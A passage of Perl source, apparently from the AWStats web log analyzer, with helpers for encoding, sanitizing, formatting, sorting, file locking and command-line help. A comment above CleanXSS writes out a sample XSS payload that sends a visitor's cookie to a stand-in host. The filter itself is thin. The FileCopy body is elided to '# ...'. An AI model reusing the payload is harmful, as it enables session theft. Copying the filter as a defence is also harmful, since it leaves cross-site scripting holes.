    for ( my $ix = 0 ; $ix < 24 ; $ix++ ) {
        $_time_h[$ix]    = 0;
        $_time_k[$ix]    = 0;
        $_time_p[$ix]    = 0;
        $_time_nv_h[$ix] = 0;
        $_time_nv_k[$ix] = 0;
        $_time_nv_p[$ix] = 0;
    }

    # Reset all hash arrays with name beginning by _
    %_session     = %_browser_h   = %_browser_p   = ();
    %_filesize = ();
    %_requesttime = ();
    %_domener_p   = %_domener_h   = %_domener_k = %_errors_h = %_errors_k = ();
    %_filetypes_h = %_filetypes_k = %_filetypes_gz_in = %_filetypes_gz_out = ();
    %_host_p = %_host_h = %_host_k = %_host_l = %_host_s = %_host_u = ();
    %_waithost_e = %_waithost_l = %_waithost_s = %_waithost_u = ();
    %_keyphrases = %_keywords   = %_os_h = %_os_p = %_pagesrefs_p = %_pagesrefs_h =
        %_robot_h  = %_robot_k    = %_robot_l = %_robot_r = ();
    %_worm_h = %_worm_k = %_worm_l = %_login_p = %_login_h = %_login_k =
        %_login_l      = %_screensize_h   = ();
    %_misc_p         = %_misc_h         = %_misc_k = ();
    %_cluster_p      = %_cluster_h      = %_cluster_k = ();
    %_se_referrals_p = %_se_referrals_h = %_sider_h = %_referer_h = %_err_host_h =
        %_url_p        = %_url_k          = %_url_e = %_url_x = ();
    %_downloads = ();
    %_unknownreferer_l = %_unknownrefererbrowser_l = ();
    %_emails_h = %_emails_k = %_emails_l = %_emailr_h = %_emailr_k =
        %_emailr_l = ();

    for ( my $ix = 1 ; $ix < @ExtraName ; $ix++ ) {
        %{ '_section_' . $ix . '_h' }   = %{ '_section_' . $ix . '_o' } =
            %{ '_section_' . $ix . '_k' } = %{ '_section_' . $ix . '_l' } =
            %{ '_section_' . $ix . '_p' } = ();
    }
    foreach my $pluginname ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } )
    {

        #   		my $function="SectionInitHashArray_$pluginname()";
        #   		eval("$function");
        my $function = "SectionInitHashArray_$pluginname";
        &$function();
    }
}

#------------------------------------------------------------------------------
# Function:     Change word separators of a keyphrase string into space and
#               remove bad coded chars
# Parameters:	stringtodecode
# Input:        None
# Output:       None
# Return:		decodedstring
#------------------------------------------------------------------------------
sub ChangeWordSeparatorsIntoSpace {
    $_[0] =~ s/%0[ad]/ /ig;          # LF CR
    $_[0] =~ s/%2[02789abc]/ /ig;    # space " ' ( ) * + ,
    $_[0] =~ s/%3a/ /ig;             # :
    $_[0] =~
        tr/\+\'\(\)\"\*,:/        /s;    # "&" and "=" must not be in this list
}

#------------------------------------------------------------------------------
# Function:		Transforms special chars by entities as needed in XML/XHTML
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub XMLEncode {
    if ( $BuildReportFormat ne 'xhtml' && $BuildReportFormat ne 'xml' ) {
        return shift;
    }
    my $string = shift;
    $string =~ s/&/&amp;/g;
    $string =~ s/</&lt;/g;
    $string =~ s/>/&gt;/g;
    $string =~ s/\"/&quot;/g;
    $string =~ s/\'/&apos;/g;
    return $string;
}

#------------------------------------------------------------------------------
# Function:		Transforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML
#				Decoding is done by XMLDecodeFromHisto.
#				AWStats data files are stored in ISO-8859-1.
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub XMLEncodeForHisto {
    my $string = shift;
    $string =~ s/\s/%20/g;
    if ( $BuildHistoryFormat ne 'xml' ) { return $string; }
    $string =~ s/=/%3d/g;
    $string =~ s/&/&amp;/g;
    $string =~ s/</&lt;/g;
    $string =~ s/>/&gt;/g;
    $string =~ s/\"/&quot;/g;
    $string =~ s/\'/&apos;/g;
    return $string;
}

#------------------------------------------------------------------------------
# Function:     Encode an ISO string to PageCode output
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub EncodeToPageCode {
    my $string = shift;
    if ( $PageCode eq 'utf-8' ) { $string = encode( "utf8", $string ); }
    return $string;
}

#------------------------------------------------------------------------------
# Function:     Encode a binary string into an ASCII string
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub EncodeString {
    my $string = shift;

    #	use bytes;
    $string =~ s/([\x2B\x80-\xFF])/sprintf ("%%%2x", ord($1))/eg;

    #	no bytes;
    $string =~ tr/ /+/s;
    return $string;
}

#------------------------------------------------------------------------------
# Function:     Decode an url encoded text string into a binary string
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:       decodedstring
#------------------------------------------------------------------------------
sub DecodeEncodedString {
    my $stringtodecode = shift;
    $stringtodecode =~ tr/\+/ /s;
    $stringtodecode =~ s/%([A-F0-9][A-F0-9])/pack("C", hex($1))/ieg;
    $stringtodecode =~ s/["']//g;

    return $stringtodecode;
}

#------------------------------------------------------------------------------
# Function:     Similar to DecodeEncodedString, but decode only
#               RFC3986 "unreserved characters"
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:       decodedstring
#------------------------------------------------------------------------------
sub DecodeRFC3986UnreservedString {
    my $stringtodecode = shift;

    $stringtodecode =~ s/%([46][1-9A-F]|[57][0-9A]|3[0-9]|2D|2E|5F|7E)/pack("C", hex($1))/ieg;

    return $stringtodecode;
}

#------------------------------------------------------------------------------
# Function:     Decode a precompiled regex value to a common regex value
# Parameters:   compiledregextodecode
# Input:        None
# Output:       None
# Return:		standardregex
#------------------------------------------------------------------------------
sub UnCompileRegex {
    shift =~ /\(\?[-^\w]*:(.*)\)/;         # Works with all perl
    # shift =~ /\(\?[-\w]*:(.*)\)/;        < perl 5.14
    return $1;
}

#------------------------------------------------------------------------------
# Function:     Clean a string of all chars that are not char or _ - \ / . \s
# Parameters:   stringtoclean, full
# Input:        None
# Output:       None
# Return:		cleanedstring
#------------------------------------------------------------------------------
sub Sanitize {
    my $stringtoclean = shift;
    my $full = shift || 0;
    if ($full) {
        $stringtoclean =~ s/[^\w\d]//g;
    }
    else {
        $stringtoclean =~ s/[^\w\d\-\\\/\.:\s]//g;
    }
    return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Clean a string of HTML tags to avoid 'Cross Site Scripting attacks'
#               and clean | char.
#				A XSS attack is providing an AWStats url with XSS code that is executed
#				when page loaded by awstats CGI is loaded from AWStats server. Such a code
#				can be<script>document.write("<img src=http://attacker.com/page.php?" + document.cookie)</script>
#				This make the browser sending a request to the attacker server that contains
#				cookie used for AWStats server sessions. Attacker can this way caught this
#				cookie and used it to go on AWStats server like original visitor. For this
#				resaon, parameter received by AWStats must be sanitized by this function
#				before being put inside a web page.
# Parameters:   stringtoclean
# Input:        None
# Output:       None
# Return:		cleanedstring
#------------------------------------------------------------------------------
sub CleanXSS {
    my $stringtoclean = shift;

    # To avoid html tags and javascript
    $stringtoclean =~ s/</&lt;/g;
    $stringtoclean =~ s/>/&gt;/g;
    $stringtoclean =~ s/|//g;

    # To avoid onload="
    $stringtoclean =~ s/onload//g;
    return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Clean tags in a string
#				AWStats data files are stored in ISO-8859-1.
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:		decodedstring
#------------------------------------------------------------------------------
sub XMLDecodeFromHisto {
    my $stringtoclean = shift;
    $stringtoclean =~ s/$regclean1/ /g;    # Replace <recnb> or </td> with space
    $stringtoclean =~ s/$regclean2//g;     # Remove others <xxx>
    $stringtoclean =~ s/%3d/=/g;
    $stringtoclean =~ s/&amp;/&/g;
    $stringtoclean =~ s/&lt;/</g;
    $stringtoclean =~ s/&gt;/>/g;
    $stringtoclean =~ s/&quot;/\"/g;
    $stringtoclean =~ s/&apos;/\'/g;
    return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Copy one file into another
# Parameters:   sourcefilename targetfilename
# Input:        None
# Output:       None
# Return:		0 if copy is ok, 1 else
#------------------------------------------------------------------------------
sub FileCopy {
    my $filesource = shift;
    my $filetarget = shift;
    if ($Debug) { debug( "FileCopy($filesource,$filetarget)", 1 ); }
    open( FILESOURCE, "$filesource" )  || return 1;
    open( FILETARGET, ">$filetarget" ) || return 1;
    binmode FILESOURCE;
    binmode FILETARGET;

    # ...
    close(FILETARGET);
    close(FILESOURCE);
    if ($Debug) { debug( " File copied", 1 ); }
    return 0;
}

#------------------------------------------------------------------------------
# Function:     Format a QUERY_STRING
# Parameters:   query
# Input:        None
# Output:       None
# Return:		formatted query
#------------------------------------------------------------------------------
# TODO Appeller cette fonction partout ou il y a des NewLinkParams
sub CleanNewLinkParamsFrom {
    my $NewLinkParams = shift;
    while ( my $param = shift ) {
        $NewLinkParams =~ s/(^|&|&amp;)$param(=[^&]*|$)//i;
    }
    $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
    $NewLinkParams =~ s/^&amp;//;
    $NewLinkParams =~ s/&amp;$//;
    return $NewLinkParams;
}

#------------------------------------------------------------------------------
# Function:     Show flags for other language translations
# Parameters:   Current languade id (en, fr, ...)
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub Show_Flag_Links {
    my $CurrentLang = shift;

    # Build flags link
    my $NewLinkParams = $QueryString;
    my $NewLinkTarget = '';
    if ( $ENV{'GATEWAY_INTERFACE'} ) {
        $NewLinkParams =
            CleanNewLinkParamsFrom( $NewLinkParams,
                ( 'update', 'staticlinks', 'framename', 'lang' ) );
        $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
        $NewLinkParams =~ s/(^|&|&amp;)lang=[^&]*//i;
        $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
        $NewLinkParams =~ s/^&amp;//;
        $NewLinkParams =~ s/&amp;$//;
        if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

        if ( $FrameName eq 'mainright' ) {
            $NewLinkTarget = " target=\"_parent\"";
        }
    }
    else {
        $NewLinkParams =
            ( $SiteConfig ? "config=$SiteConfig&amp;" : "" )
                . "year=$YearRequired&amp;month=$MonthRequired&amp;";
    }
    if ( $NewLinkParams !~ /output=/ ) { $NewLinkParams .= 'output=main&amp;'; }
    if ( $FrameName eq 'mainright' ) {
        $NewLinkParams .= 'framename=index&amp;';
    }

    foreach my $lng ( split( /\s+/, $ShowFlagLinks ) ) {
        $lng =
            $LangBrowserToLangAwstats{$lng}
                ? $LangBrowserToLangAwstats{$lng}
                : $lng;
        if ( $lng ne $CurrentLang ) {
            my %lngtitle = (
                'en', 'English', 'fr', 'French', 'de', 'German',
                'it', 'Italian', 'nl', 'Dutch',  'es', 'Spanish'
            );
            my $lngtitle = ( $lngtitle{$lng} ? $lngtitle{$lng} : $lng );
            my $flag = (
                $LangAWStatsToFlagAwstats{$lng}
                    ? $LangAWStatsToFlagAwstats{$lng}
                    : $lng
            );
            print "<a href=\""
                . XMLEncode("$AWScript${NewLinkParams}lang=$lng")
                . "\"$NewLinkTarget><img src=\"$DirIcons\/flags\/$flag.png\" height=\"14\" border=\"0\""
                . AltTitle("$lngtitle")
                . " /></a>&nbsp;\n";
        }
    }
}

#------------------------------------------------------------------------------
# Function:		Format value in bytes in a string (Bytes, Kb, Mb, Gb)
# Parameters:   bytes (integer value or "0.00")
# Input:        None
# Output:       None
# Return:       "x.yz MB" or "x.yy KB" or "x Bytes" or "0"
#------------------------------------------------------------------------------
sub Format_Bytes {
    my $bytes = shift || 0;
    my $fudge = 1;

    # Do not use exp/log function to calculate 1024power, function make segfault on some unix/perl versions
    if ( $bytes >= ( $fudge << 40 ) ) {
        return sprintf( "%.2f", $bytes / 1099511627776 ) . " $Message[180]";
    }
    if ( $bytes >= ( $fudge << 30 ) ) {
        return sprintf( "%.2f", $bytes / 1073741824 ) . " $Message[110]";
    }
    if ( $bytes >= ( $fudge << 20 ) ) {
        return sprintf( "%.2f", $bytes / 1048576 ) . " $Message[109]";
    }
    if ( $bytes >= ( $fudge << 10 ) ) {
        return sprintf( "%.2f", $bytes / 1024 ) . " $Message[108]";
    }
    if ( $bytes < 0 ) { $bytes = "?"; }
    return int($bytes) . ( int($bytes) ? " $Message[119]" : "" );
}

#------------------------------------------------------------------------------
# Function:		Format a number with commas or any other separator
#				CL: courtesy of http://www.perlmonks.org/?node_id=2145
# Parameters:   number
# Input:        None
# Output:       None
# Return:       "999,999,999,999"
#------------------------------------------------------------------------------
sub Format_Number {
    my $number = shift || 0;
    $number =~ s/(\d)(\d\d\d)$/$1 $2/;
    $number =~ s/(\d)(\d\d\d\s\d\d\d)$/$1 $2/;
    $number =~ s/(\d)(\d\d\d\s\d\d\d\s\d\d\d)$/$1 $2/;
    my $separator = $Message[177];
    if ($separator eq '') { $separator=' '; }	# For backward compatibility
    $number =~ s/ /$separator/g;
    return $number;
}

#------------------------------------------------------------------------------
# Function:		Return " alt=string title=string"
# Parameters:   string
# Input:        None
# Output:       None
# Return:       "alt=string title=string"
#------------------------------------------------------------------------------
sub AltTitle {
    my $string = shift || '';
    return " alt='$string' title='$string'";

    #	return " alt=\"$string\" title=\"$string\"";
    #	return ($BuildReportFormat?"":" alt=\"$string\"")." title=\"$string\"";
}

#------------------------------------------------------------------------------
# Function:		Tell if an email is a local or external email
# Parameters:   email
# Input:        $SiteDomain(exact string) $HostAliases(quoted regex string)
# Output:       None
# Return:       -1, 0 or 1
#------------------------------------------------------------------------------
sub IsLocalEMail {
    my $email = shift || 'unknown';
    if ( $email !~ /\@(.*)$/ ) { return 0; }
    my $domain = $1;
    if ( $domain =~ /^$SiteDomain$/i ) { return 1; }
    foreach (@HostAliases) {
        if ( $domain =~ /$_/ ) { return 1; }
    }
    return -1;
}

#------------------------------------------------------------------------------
# Function:		Format a date according to Message[78] (country date format)
# Parameters:   String date YYYYMMDDHHMMSS
#               Option 0=LastUpdate and LastTime date
#                      1=Arrays date except daymonthvalues
#                      2=daymonthvalues date (only year month and day)
# Input:        $Message[78]
# Output:       None
# Return:       Date with format defined by Message[78] and option
#------------------------------------------------------------------------------
sub Format_Date {
    my $date       = shift;
    my $option     = shift || 0;
    my $year       = substr( "$date", 0, 4 );
    my $month      = substr( "$date", 4, 2 );
    my $day        = substr( "$date", 6, 2 );
    my $hour       = substr( "$date", 8, 2 );
    my $min        = substr( "$date", 10, 2 );
    my $sec        = substr( "$date", 12, 2 );
    my $dateformat = $Message[78];

    if ( $option == 2 ) {
        $dateformat =~ s/^[^ymd]+//g;
        $dateformat =~ s/[^ymd]+$//g;
    }
    $dateformat =~ s/yyyy/$year/g;
    $dateformat =~ s/yy/$year/g;
    $dateformat =~ s/mmm/$MonthNumLib{$month}/g;
    $dateformat =~ s/mm/$month/g;
    $dateformat =~ s/dd/$day/g;
    $dateformat =~ s/HH/$hour/g;
    $dateformat =~ s/MM/$min/g;
    $dateformat =~ s/SS/$sec/g;
    return "$dateformat";
}

#------------------------------------------------------------------------------
# Function:     Return 1 if string contains only ascii chars
# Parameters:   string
# Input:        None
# Output:       None
# Return:       0 or 1
#------------------------------------------------------------------------------
sub IsAscii {
    my $string = shift;
    if ($Debug) { debug( "IsAscii($string)", 5 ); }
    if ( $string =~ /^[\w\+\-\/\\\.%,;:=\"\'&?!\s]+$/ ) {
        if ($Debug) { debug( " Yes", 6 ); }
        return
            1
        ; # Only alphanum chars (and _) or + - / \ . % , ; : = " ' & ? space \t
    }
    if ($Debug) { debug( " No", 6 ); }
    return 0;
}

#------------------------------------------------------------------------------
# Function:     Return the lower value between 2 but exclude value if 0
# Parameters:   Val1 and Val2
# Input:        None
# Output:       None
# Return:       min(Val1,Val2)
#------------------------------------------------------------------------------
sub MinimumButNoZero {
    my ( $val1, $val2 ) = @_;
    return ( $val1 && ( $val1 < $val2 || !$val2 ) ? $val1 : $val2 );
}

#------------------------------------------------------------------------------
# Function:     Add a val from sorting tree
# Parameters:   keytoadd keyval [firstadd]
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub AddInTree {
    my $keytoadd = shift;
    my $keyval   = shift;
    my $firstadd = shift || 0;
    if ( $firstadd == 1 ) {    # Val is the first one
        if ($Debug) { debug( "  firstadd", 4 ); }
        $val{$keyval} = $keytoadd;
        $lowerval = $keyval;
        if ($Debug) {
            debug(
                "  lowerval=$lowerval, nb elem val="
                    . ( scalar keys %val )
                    . ", nb elem egal="
                    . ( scalar keys %egal ) . ".",
                4
            );
        }
        return;
    }
    if ( exists($val{$keyval}) ) {    # Val is already in tree
        if ($Debug) { debug( "  val is already in tree", 4 ); }
        $egal{$keytoadd} = $val{$keyval};
        $val{$keyval}    = $keytoadd;
        if ($Debug) {
            debug(
                "  lowerval=$lowerval, nb elem val="
                    . ( scalar keys %val )
                    . ", nb elem egal="
                    . ( scalar keys %egal ) . ".",
                4
            );
        }
        return;
    }
    if ( $keyval <= $lowerval )
    {    # Val is a new one lower (should happens only when tree is not full)
        if ($Debug) {
            debug(
                "  keytoadd val=$keyval is lower or equal to lowerval=$lowerval",
                4
            );
        }
        $val{$keyval}     = $keytoadd;
        $nextval{$keyval} = $lowerval;
        $lowerval         = $keyval;
        if ($Debug) {
            debug(
                "  lowerval=$lowerval, nb elem val="
                    . ( scalar keys %val )
                    . ", nb elem egal="
                    . ( scalar keys %egal ) . ".",
                4
            );
        }
        return;
    }

    # Val is a new one higher
    if ($Debug) {
        debug( "  keytoadd val=$keyval is higher than lowerval=$lowerval", 4 );
    }
    $val{$keyval} = $keytoadd;
    my $valcursor = $lowerval;    # valcursor is value just before keyval
    while ( $nextval{$valcursor} && ( $nextval{$valcursor} < $keyval ) ) {
        $valcursor = $nextval{$valcursor};
    }
    if ( exists($nextval{$valcursor}) )
    {    # keyval is between valcursor and nextval{valcursor}
        $nextval{$keyval} = $nextval{$valcursor};
    }
    $nextval{$valcursor} = $keyval;
    if ($Debug) {
        debug(
            "  lowerval=$lowerval, nb elem val="
                . ( scalar keys %val )
                . ", nb elem egal="
                . ( scalar keys %egal ) . ".",
            4
        );
    }
}

#------------------------------------------------------------------------------
# Function:     Remove a val from sorting tree
# Parameters:   None
# Input:        $lowerval %val %egal
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub Removelowerval {
    my $keytoremove = $val{$lowerval};    # This is lower key
    if ($Debug) {
        debug( "   remove for lowerval=$lowerval: key=$keytoremove", 4 );
    }
    if ( exists($egal{$keytoremove}) ) {
        $val{$lowerval} = $egal{$keytoremove};
        delete $egal{$keytoremove};
    }
    else {
        delete $val{$lowerval};
        $lowerval = $nextval{$lowerval};    # Set new lowerval
    }
    if ($Debug) {
        debug(
            "   new lower value=$lowerval, val size="
                . ( scalar keys %val )
                . ", egal size="
                . ( scalar keys %egal ),
            4
        );
    }
}

#------------------------------------------------------------------------------
# Function:     Build @keylist array
# Parameters:   Size max for @keylist array,
#               Min value in hash for select,
#               Hash used for select,
#               Hash used for order
# Input:        None
# Output:       None
# Return:       @keylist response array
#------------------------------------------------------------------------------
sub BuildKeyList {
    my $ArraySize = shift || error(
        "System error. Call to BuildKeyList function with incorrect value for first param",
        "", "", 1
    );
    my $MinValue = shift || error(
        "System error. Call to BuildKeyList function with incorrect value for second param",
        "", "", 1
    );
    my $hashforselect = shift;
    my $hashfororder  = shift;
    if ($Debug) {
        debug(
            "  BuildKeyList($ArraySize,$MinValue,$hashforselect with size="
                . ( scalar keys %$hashforselect )
                . ",$hashfororder with size="
                . ( scalar keys %$hashfororder ) . ")",
            3
        );
    }
    delete $hashforselect->{ ''
    }; # Those is to protect from infinite loop when hash array has an incorrect null key
    my $count = 0;
    $lowerval = 0;    # Global because used in AddInTree and Removelowerval
    %val      = ();
    %nextval  = ();
    %egal     = ();

    foreach my $key ( keys %$hashforselect ) {
        if ( $count < $ArraySize ) {
            if ( $hashforselect->{$key} >= $MinValue ) {
                $count++;
                if ($Debug) {
                    debug(
                        "  Add in tree entry $count : $key (value="
                            . ( $hashfororder->{$key} || 0 )
                            . ", tree not full)",
                        4
                    );
                }
                AddInTree( $key, $hashfororder->{$key} || 0, $count );
            }
            next;
        }
        $count++;
        if ( ( $hashfororder->{$key} || 0 ) <= $lowerval ) { next; }
        if ($Debug) {
            debug(
                "  Add in tree entry $count : $key (value="
                    . ( $hashfororder->{$key} || 0 )
                    . " > lowerval=$lowerval)",
                4
            );
        }
        AddInTree( $key, $hashfororder->{$key} || 0 );
        if ($Debug) { debug( "  Removelower in tree", 4 ); }
        Removelowerval();
    }

    # Build key list and sort it
    if ($Debug) {
        debug(
            "  Build key list and sort it. lowerval=$lowerval, nb elem val="
                . ( scalar keys %val )
                . ", nb elem egal="
                . ( scalar keys %egal ) . ".",
            3
        );
    }
    my %notsortedkeylist = ();
    foreach my $key ( values %val )  { $notsortedkeylist{$key} = 1; }
    foreach my $key ( values %egal ) { $notsortedkeylist{$key} = 1; }
    @keylist = ();
    @keylist = (
        sort { ( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 ) }
            keys %notsortedkeylist
    );
    if ($Debug) {
        debug( "  BuildKeyList End (keylist size=" . (@keylist) . ")", 3 );
    }
    return;
}

#------------------------------------------------------------------------------
# Function:     Lock or unlock update
# Parameters:   status (1 to lock, 0 to unlock)
# Input:        $DirLock (if status=0) $PROG $FileSuffix
# Output:       $DirLock (if status=1)
# Return:       None
#------------------------------------------------------------------------------
sub Lock_Update {
    my $status = shift;
    my $lock   = "$PROG$FileSuffix.lock";
    if ($status) {

        # We stop if there is at least one lock file wherever it is
        foreach my $key ( $ENV{"TEMP"}, $ENV{"TMP"}, "/tmp", "/", "." ) {
            my $newkey = $key;
            $newkey =~ s/[\\\/]$//;
            if ( -f "$newkey/$lock" ) {
                error(
                    "An AWStats update process seems to be already running for this config file. Try later.\nIf this is not true, remove manually lock file '$newkey/$lock'.",
                    "", "", 1
                );
            }
        }

        # Set lock where we can
        foreach my $key ( $ENV{"TEMP"}, $ENV{"TMP"}, "/tmp", "/", "." ) {
            if ( !-d "$key" ) { next; }
            $DirLock = $key;
            $DirLock =~ s/[\\\/]$//;
            if ($Debug) { debug("Update lock file $DirLock/$lock is set"); }
            open( LOCK, ">$DirLock/$lock" )
                || error( "Failed to create lock file $DirLock/$lock", "", "",
                1 );
            print LOCK
                "AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\n";
            close(LOCK);
            last;
        }
    }
    else {

        # Remove lock
        if ($Debug) { debug("Update lock file $DirLock/$lock is removed"); }
        unlink("$DirLock/$lock");
    }
    return;
}

#------------------------------------------------------------------------------
# Function:     Signal handler to call Lock_Update to remove lock file
# Parameters:   Signal name
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub SigHandler {
    my $signame = shift;
    print ucfirst($PROG) . " process (ID $$) interrupted by signal $signame.\n";
    &Lock_Update(0);
    exit 1;
}

#------------------------------------------------------------------------------
# Function:     Convert an IPAddress into an integer
# Parameters:   IPAddress
# Input:        None
# Output:       None
# Return:       Int
#------------------------------------------------------------------------------
sub Convert_IP_To_Decimal {
    my ($IPAddress) = @_;
    my @ip_seg_arr = split( /\./, $IPAddress );
    my $decimal_ip_address =
        256 * 256 * 256 * $ip_seg_arr[0] + 256 * 256 * $ip_seg_arr[1] + 256 *
            $ip_seg_arr[2] + $ip_seg_arr[3];
    return ($decimal_ip_address);
}

#------------------------------------------------------------------------------
# Function:     Test there is at least one value in list not null
# Parameters:   List of values
# Input:        None
# Output:       None
# Return:       1 There is at least one not null value, 0 else
#------------------------------------------------------------------------------
sub AtLeastOneNotNull {
    if ($Debug) {
        debug( " Call to AtLeastOneNotNull (" . join( '-', @_ ) . ")", 3 );
    }
    foreach my $val (@_) {
        if ($val) { return 1; }
    }
    return 0;
}

#------------------------------------------------------------------------------
# Function:     Prints the command line interface help information
# Parameters:   None
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub PrintCLIHelp{
    &Read_Ref_Data(
        'browsers',       'domains', 'operating_systems', 'robots',
        'search_engines', 'worms'
    );
    print "----- $PROG $VERSION (c) 2000-2023 Laurent Destailleur -----\n";
    print
        "AWStats is a free web server logfile analyzer to show you advanced web\n";
    print "statistics.\n";
    print
        "AWStats comes with ABSOLUTELY NO WARRANTY. It's a free software distributed\n";
    print "with a GNU General Public License (See LICENSE file for details).\n";
    print "\n";
    print "Syntax: $PROG.$Extension -config=virtualhostname [options]\n";
    print "\n";
    print
        "  This runs $PROG in command line to update statistics (-update option) of a\n";
    print
        "   web site, from the log file defined in AWStats config file, or build a HTML\n";
    print "   report (-output option).\n";
    print
        "  First, $PROG tries to read $PROG.virtualhostname.conf as the config file.\n";
    print "  If not found, $PROG tries to read $PROG.conf, and finally the full path passed to -config=\n";
    print
        "  Note 1: Config files ($PROG.virtualhostname.conf or $PROG.conf) must be\n";
    print
        "   in /etc/awstats, /usr/local/etc/awstats, /etc or same directory than\n";
    print "   awstats.pl script file.\n";
    print
        "  Note 2: If AWSTATS_FORCE_CONFIG environment variable is defined, AWStats will\n";
    print
        "   use it as the \"config\" value, whatever is the value on command line or URL.\n";
    print "   See AWStats documentation for all setup instrutions.\n";
    print "\n";
    print "Options to update statistics:\n";
    print "  -update        to update statistics (default)\n";
    print
        "  -showsteps     to add benchmark information every $NBOFLINESFORBENCHMARK lines processed\n";
    print
        "  -showcorrupted to add output for each corrupted lines found, with reason\n";
    print
        "  -showdropped   to add output for each dropped lines found, with reason\n";
    print "  -showunknownorigin  to output referer when it can't be parsed\n";
    print
        "  -showdirectorigin   to output log line when origin is a direct access\n";
    print "  -updatefor=n   to stop the update process after parsing n lines\n";
    print
        "  -LogFile=x     to change log to analyze whatever is 'LogFile' in config file\n";
    print
        "  Be care to process log files in chronological order when updating statistics.\n";
    print "\n";
    print "Options to show statistics:\n";
    print
        "  -output      to output main HTML report (no update made except with -update)\n";
    print "  -output=x    to output other report pages where x is:\n";
    print
        "               alldomains       to build page of all domains/countries\n";
    print "               allhosts         to build page of all hosts\n";
    print
        "               lasthosts        to build page of last hits for hosts\n";
    print
        "               unknownip        to build page of all unresolved IP\n";
    print
        "               allemails        to build page of all email senders (maillog)\n";
    print
        "               lastemails       to build page of last email senders (maillog)\n";
    print
        "               allemailr        to build page of all email receivers (maillog)\n";
    print
        "               lastemailr       to build page of last email receivers (maillog)\n";
    print "               alllogins        to build page of all logins used\n";
    print
        "               lastlogins       to build page of last hits for logins\n";
    print
        "               allrobots        to build page of all robots/spider visits\n";
    print
        "               lastrobots       to build page of last hits for robots\n";
    print "               urldetail        to list most often viewed pages \n";
    print
        "               urldetail:filter to list most often viewed pages matching filter\n";
    print "               urlentry         to list entry pages\n";
    print
        "               urlentry:filter  to list entry pages matching filter\n";
    print "               urlexit          to list exit pages\n";
    print
        "               urlexit:filter   to list exit pages matching filter\n";
    print
        "               osdetail         to build page with os detailed versions\n";
    print
        "               browserdetail    to build page with browsers detailed versions\n";
    print
        "               unknownbrowser   to list 'User Agents' with unknown browser\n";
    print
        "               unknownos        to list 'User Agents' with unknown OS\n";
    print
        "               refererse        to build page of all refering search engines\n";
    print
        "               refererpages     to build page of all refering pages\n";

    #print "               referersites     to build page of all refering sites\n";
    print
        "               keyphrases       to list all keyphrases used on search engines\n";
    print
        "               keywords         to list all keywords used on search engines\n";
    print "               errors404        to list 'Referers' for 404 errors\n";
    print
        "               allextraX        to build page of all values for ExtraSection X\n";
    print "  -staticlinks           to have static links in HTML report page\n";
    print "  -staticlinksext=xxx    to have static links with .xxx extension instead of .html\n";
    print
        "  -lang=LL     to output a HTML report in language LL (en,de,es,fr,it,nl,...)\n";
    print "  -month=MM    to output a HTML report for an old month MM\n";
    print "  -year=YYYY   to output a HTML report for an old year YYYY\n";
    print
        "  The 'date' options doesn't allow you to process old log file. They only\n";
    print
        "  allow you to see a past report for a chosen month/year period instead of\n";
    print "  current month/year.\n";
    print "\n";
    print "Other options:\n";
    print
        "  -debug=X     to add debug informations lesser than level X (speed reduced)\n";
    print
        "  -version     show AWStats version\n";
    print "\n";
    print "Now supports/detects:\n";
    print
        "  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)\n";
    print "  Reverse DNS lookup (IPv4 and IPv6) and GeoIP lookup\n";
    print "  Number of visits, number of unique visitors\n";
    print "  Visits duration and list of last visits\n";
    print "  Authenticated users\n";
    print "  Days of week and rush hours\n";
    print "  Hosts list and unresolved IP addresses list\n";
    print "  Most viewed, entry and exit pages\n";
    print "  Files type and Web compression (mod_gzip, mod_deflate stats)\n";
    print "  Screen size\n";
    print "  Ratio of Browsers with support of: Java, Flash, RealG2 reader,\n";
    print "                        Quicktime reader, WMA reader, PDF reader\n";
    print "  Configurable personalized reports\n";
    print "  " . ( scalar keys %DomainsHashIDLib ) . " domains/countries\n";
    print "  " . ( scalar keys %RobotsHashIDLib ) . " robots\n";
    print "  " . ( scalar keys %WormsHashLib ) . " worm's families\n";
    print "  " . ( scalar keys %OSHashLib ) . " operating systems\n";
    print "  " . ( scalar keys %BrowsersHashIDLib ) . " browsers";
    &Read_Ref_Data('browsers_phone');
    print " ("
        . ( scalar keys %BrowsersHashIDLib )
        . " with phone browsers database)\n";
    print "  "
        . ( scalar keys %SearchEnginesHashLib )
        . " search engines (and keyphrases/keywords used from them)\n";
    print "  All HTTP errors with last referrer\n";
    print "  Report by day/month/year\n";
    print "  Dynamic or static HTML or XHTML reports, static PDF reports\n";
    print "  Indexed text or XML monthly database\n";
    print "  And a lot of other advanced features and options...\n";
    print "New versions and FAQ at http://www.awstats.org\n";
}

#------------------------------------------------------------------------------
# Function:     Return the string to add in html tag to include popup javascript code
# Parameters:   tooltip number
# Input:        None
# Output:       None
# Return:       string with javascript code
#------------------------------------------------------------------------------
sub Tooltip {
    my $ttnb = shift;
    return (
        $TOOLTIPON
